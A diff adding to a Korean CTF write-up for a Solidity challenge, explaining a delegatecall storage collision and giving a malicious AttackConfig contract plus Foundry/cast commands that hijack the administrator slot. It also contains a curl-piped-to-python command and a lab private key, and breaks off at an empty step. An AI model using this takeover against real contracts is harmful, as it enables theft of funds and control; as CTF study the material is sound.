@@ -20,7 +20,7 @@ tags: [ctf, misc, 2025 ACS]
 
 ### 1-1. Setup.sol
 
-```solidity
+```python
 contract Setup {
     IndustrialControlSystem public icsContract;
     ConfigurationLibrary public configLib;
@@ -203,3 +203,243 @@ contract DiagnosticLibrary {
 ---
 
 ## 2. 취약점 분석
+
+### 2-1. delegatecall + storage 충돌  
+
+ICS의 앞부분 storage : 
+
+```pythone
+address public configurationLibrary; // slot 0
+address public diagnosticLibrary;    // slot 1
+address public administrator;        // slot 2
+// ...
+SystemConfig public config;          // 이후 슬롯들
+```
+
+ConfigurationLibrary 의 storage : 
+
+```python
+uint256 public configValue; // slot 0
+```
+
+updateSystemConfig 실핼 시 : 
+
+```python
+configurationLibrary.delegatecall(
+    abi.encodePacked(CONFIG_SIG, _value)
+);
+```
+
+- delegatecall -> 코드만 라이브러리, **storage는 ICS 것 사용**
+- ConfigurationLibrary.updateConfig(uint256)의 내용 :
+
+```python
+configValue = _value;
+```
+
+-> 실제로는 **ICS.storage[0] (configurationLibrary)**를 _value로 덮어쓰기.  
+즉, updateSystemConfig(ATTACK_ADDR)을 호출하면  
+ICS.configurationLibrary = ATTACK_ADDR로 변경할 수 있으며 이게 전체 공격의 시작점이다.  
+
+--- 
+
+### 2-2. 악성 라이브러리로 administrator 탈취
+
+configurationLibrary를 우리가 만든 공격 컨트랙트로 바꾸면,  
+그 다음에 updateSystemConfig(0)을 한 번 더 호출했을 때:  
+- delegatecall 대상: AttackConfig  
+- AttackConfig.updateConfig(uint256)를 ICS context에서 실행  
+- assembly로 ICS.storage[2] (= administrator) 를 우리가 원하는 값으로 바꿀 수 있다.
+  
+예시 공격 컨트랙트:
+
+```python
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract AttackConfig {
+    function updateConfig(uint256) public {
+        assembly {
+            // ICS의 slot 2 = administrator
+            sstore(2, origin())
+        }
+    }
+}
+```
+
+- origin() = 트랙잭션을 날린 EOA (플레이어)
+- 최종적으로 ICS.administrator = EOA 주소.
+  
+그 다음엔 EOA가 ICS.claimVictory() 를 직접 호출 가능하다.  
+
+---
+
+## 3. 공격 시나리오 개요
+
+정리하면:  
+delegatecall로 ICS의 configurationLibrary를 우리가 만든 악성 라이브러리로 바꾼 뒤,  
+다시 delegatecall을 실행시켜 administrator를 우리 계정으로 바꾸고,  
+claimVictory()를 호출해 solved = true 를 만든다.  
+  
+실제 단계:  
+1. PoW 풀고 새 인스턴스 생성 → UUID, PK, RPC, Setup 주소 확보  
+2. Setup.getChallengeInfo() 를 호출해서 ICS 주소를 구한다.  
+3. 악성 라이브러리 AttackConfig 배포.  
+4. ICS에 대해 updateSystemConfig(ATTACK_ADDR) 호출 → configurationLibrary = ATTACK.  
+5. 다시 updateSystemConfig(0) 호출 → AttackConfig.updateConfig 실행, administrator = our EOA.  
+6. ICS.claimVictory() 호출 → solved = true.  
+7. nc에서 action 3 → uuid 입력 → 플래그 출력.  
+
+---
+
+## 4. 실제 익스플로잇 (Foundry + cast 기준)
+
+### 4-1. 익스턴스 생성 & 정보 확보 
+
+```python
+nc 10.100.0.11 30000
+
+1 - launch new instance
+2 - kill instance
+3 - get flag (if isSolved() is true)
+action? 1
+```
+
+PoW 요구 나오면, 문제에서 알려준대로:
+
+```python
+python3 <(curl -sSL <https://minaminao.github.io/tools/solve-pow.py>)  24
+```
+
+출력된 your_input 값을 YOUR_INPUT에 넣어 PoW 통과.  
+
+성공하면 이러한 정보가 나온다:
+
+```python
+uuid:               4bf39146-52b8-4123-94cd-cdefb83e1ff8
+rpc endpoint:       <http://localhost:30001/4bf39146-52b8-4123-94cd-cdefb83e1ff8>
+private key:        0x1f0e68e8...
+your address:       0x8bB14741...
+challenge contract: 0xf8e72f01...
+```
+
+### 4-2. 환경 변수 설정
+
+WSL 에서:
+
+```python
+export UUID="4bf39146-52b8-4123-94cd-cdefb83e1ff8"
+export RPC="<http://10.100.0.11:30001/$UUID>"
+export PK="0x1f0e68e889f73460ec5c8e0bf1f6c99e9a03c1a6eed211db080ddb30f40ae033"
+export SETUP="0xf8e72f01818D68c30f5945cC3f53A2e41a818436"
+```
+
+Foundry cast는 eth_sandbox에서 **X-UUID 헤더**도 필요하므로,  
+모든 RPC 호출에 --rpc-headers "X-UUID:$UUID"를 붙였다.  
+
+---
+
+### 4-3. Setup에서 ICS 주소 가져오기
+
+```python
+cast call \\
+  --rpc-url $RPC \\
+  --rpc-headers "X-UUID:$UUID" \\
+  $SETUP \\
+  "getChallengeInfo()"
+```
+
+반환값(ABI-encoded)을 32바이트씩 나누면 첫 번째 20바이트가 ICS 주소:
+
+```python
+icsAddress = 0x97d5764ed2a5341deaeb9d6553f0c2398f642b48
+...
+```
+
+환경변수로 저장:
+
+```python
+export ICS=0x97d5764ed2a5341deaeb9d6553f0c2398f642b48
+```
+
+---
+
+### 4-4. 악성 라이브러리 AttackConfig.sol 작성 & 배포
+
+src/AttackConfig.sol:
+
+```python
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract AttackConfig {
+    function updateConfig(uint256) public {
+        assembly {
+            // ICS의 storage slot 2는 administrator
+            sstore(2, origin())
+        }
+    }
+}
+```
+
+컴파일:
+
+```python
+forge build
+```
+
+배포:
+
+```python
+forge create src/AttackConfig.sol:AttackConfig \\
+  --rpc-url $RPC \\
+  --rpc-headers "X-UUID:$UUID" \\
+  --private-key $PK \\
+  --broadcast
+```
+
+출력 예:
+
+```python
+Deployer: 0x8bB147419e2358ef70b1c3EF33dC4EeAB5970200
+Deployed to: 0x1d7A6A28F179B5ec87a05E469a061dABc449d5eb
+Transaction hash: ...
+```
+
+공격 컨트랙트 주소 저:
+
+```python
+export ATTACK=0x1d7A6A28F179B5ec87a05E469a061dABc449d5eb
+```
+
+---
+
+### 4-5. 1단계 - configurationLibrary = ATTACK 으로 덮어쓰기
+
+```python
+cast send \\
+  --rpc-url $RPC \\
+  --rpc-headers "X-UUID:$UUID" \\
+  --private-key $PK \\
+  $ICS \\
+  "updateSystemConfig(uint256)" $(cast to-dec $ATTACK)
+```
+
+- onlyRole(Role.OPERATOR) → default 0으로 누구나 통과.  
+- systemSafety → 초기값 true라 통과.  
+- delegatecall로 ConfigurationLibrary.updateConfig(ATTACK) 실행  
+- → ICS.slot0 (= configurationLibrary) = ATTACK 주소로 변경.
+트랜잭션 결과에서 status 1 (success) 확인.
+
+---
+
+### 4-6. 2단계 - administrator 탈취
+
+
+
+
+
+
+
+
+
